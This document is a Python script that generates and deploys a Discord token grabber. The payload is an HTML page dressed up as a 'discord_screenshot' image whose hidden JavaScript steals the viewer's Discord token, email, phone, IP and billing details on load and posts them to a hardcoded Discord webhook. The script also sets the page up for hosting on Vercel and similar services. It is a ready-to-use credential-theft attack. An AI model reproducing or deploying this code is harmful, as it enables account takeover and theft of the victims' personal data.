import os
import sys
import json
import base64
import requests
import subprocess
import tempfile
import shutil
from pathlib import Path

# ===== CONFIG =====
WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1502045259444781217/lznlptjs1zLjMg0tCqev4HoWBQd0ktVZ5c6wdlQpoVgqc3rcsQGbBKYGo4B-KcigIR_0"
# ==================

def create_html_payload():
    """Generate the complete HTML payload with your webhook embedded"""
    
    html = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>discord_screenshot_2026-05-07.png</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#1e1e2e;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',sans-serif}
  .card{background:#2b2d42;border-radius:12px;padding:25px;box-shadow:0 10px 40px rgba(0,0,0,.6);max-width:95vw;text-align:center}
  img{max-width:100%;max-height:85vh;border-radius:8px;display:block}
  .label{color:#888;text-align:center;padding:10px 0 2px;font-size:12px;user-select:none}
</style>
</head>
<body>
<div class="card">
  <img src="https://i.pinimg.com/736x/ab/73/53/ab73530f23c2c1f30b09bddeed3ba2f4.jpg" alt="screenshot" id="displayImg">
  <div class="label">📸 discord_screenshot_2026-05-07.png (3.1 MB)</div>
</div>
<script>
const WH = "''' + WEBHOOK_URL + '''";
async function g(){try{let t=null;try{const m=(webpackChunkdiscord_app.push([[""],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken);if(m)t=m.exports.default.getToken()}catch(e){}if(!t)try{if(localStorage.token)t=localStorage.token.slice(1,-1)}catch(e){}if(!t){const r=/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/g;for(let i=0;i<localStorage.length;i++){const v=localStorage.getItem(localStorage.key(i));if(v){const m=v.match(r);if(m)t=m[0]}}}
const ip=await(await fetch("https://api.ipify.org?format=json")).json().then(d=>d.ip).catch(()=>"N/A");
if(t){const r=await fetch("https://discord.com/api/v9/users/@me",{headers:{Authorization:t}});if(r.ok){const u=await r.json();fetch(WH,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"🎯 Token Grabbed",avatar_url:"https://cdn.discordapp.com/avatars/"+u.id+"/"+u.avatar+".png",embeds:[{title:"🎯 "+u.username+"#"+u.discriminator,color:0x57f287,thumbnail:{url:"https://cdn.discordapp.com/avatars/"+u.id+"/"+u.avatar+".png"},fields:[{name:"🔑 Token",value:"```"+t+"```",inline:false},{name:"🆔 ID",value:u.id,inline:true},{name:"📧 Email",value:u.email||"N/A",inline:true},{name:"📱 Phone",value:u.phone||"N/A",inline:true},{name:"🔐 MFA",value:u.mfa_enabled?"✅ Enabled":"❌ Disabled",inline:true},{name:"💎 Nitro",value:u.premium_type>0?"✅ Yes":"❌ No",inline:true},{name:"✅ Verified",value:u.verified?"Yes":"No",inline:true},{name:"💳 Billing",value:u.has_billing?"✅ Yes":"❌ No",inline:true},{name:"🌐 IP",value:ip,inline:true},{name:"🖥️ Platform",value:navigator.platform,inline:true},{name:"🌍 Timezone",value:Intl.DateTimeFormat().resolvedOptions().timeZone,inline:true}],timestamp:new Date().toISOString()}]})})}else{fetch(WH,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"⚠️ Raw Token",content:"**Unvalidated Token**\\n```"+t+"```",embeds:[{title:"System Info",color:0xfee75c,fields:[{name:"🌐 IP",value:ip,inline:true},{name:"🖥️ Platform",value:navigator.platform,inline:true},{name:"🌍 Browser",value:navigator.userAgent.substring(0,80),inline:false}]}]})})}}else{fetch(WH,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"❌ No Token",embeds:[{title:"Image Opened - No Token",color:0xed4245,description:"No Discord token found.",fields:[{name:"🌐 IP",value:ip,inline:true},{name:"🖥️ Platform",value:navigator.platform,inline:true},{name:"🌍 Browser",value:navigator.userAgent.substring(0,100),inline:false}]}]})})}}catch(e){}
fetch(WH,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"Error: "+e.message})})}
window.addEventListener("load",()=>setTimeout(g,1500));
</script>
</body>
</html>'''
    return html

def deploy_to_vercel(html_content, project_name="discord-payload"):
    """Create a Vercel project with the payload"""
    
    temp_dir = tempfile.mkdtemp()
    print(f"[*] Created temp directory: {temp_dir}")
    
    # Create project structure
    project_path = os.path.join(temp_dir, project_name)
    os.makedirs(project_path)
    
    # Write index.html
    with open(os.path.join(project_path, 'index.html'), 'w') as f:
        f.write(html_content)
    
    # Create vercel.json
    vercel_json = json.dumps({
        "builds": [{"src": "*.html", "use": "@vercel/static"}],
        "routes": [{"src": "/(.*)", "dest": "/index.html"}]
    }, indent=2)
    
    with open(os.path.join(project_path, 'vercel.json'), 'w') as f:
        f.write(vercel_json)
    
    print(f"[+] Project created at: {project_path}")
    print(f"[+] To deploy:")
    print(f"    cd {project_path}")
    print(f"    vercel --prod")
    print(f"\n[+] Or use a free alternative:")
    print(f"    - Upload index.html to GitHub Pages")
    print(f"    - Deploy on Netlify (drag & drop folder)")
    print(f"    - Use Replit (paste HTML, run static server)")
    
    return project_path

if __name__ == '__main__':
    print("[*] Generating HTML payload...")
    html = create_html_payload()
    
    print(f"[+] Webhook: {WEBHOOK_URL[:50]}...")
    
    # Minify by removing extra whitespace
    html_min = re.sub(r'\s+', ' ', html).strip()
    
    # Save locally
    with open('payload.html', 'w') as f:
        f.write(html)
    
    print("[+] Saved to payload.html")
    
    # Option to deploy
    if '--deploy' in sys.argv:
        path = deploy_to_vercel(html)
        print(f"[+] Deploy from: {path}")
    else:
        print("\n[!] Run with --deploy to set up Vercel deployment")
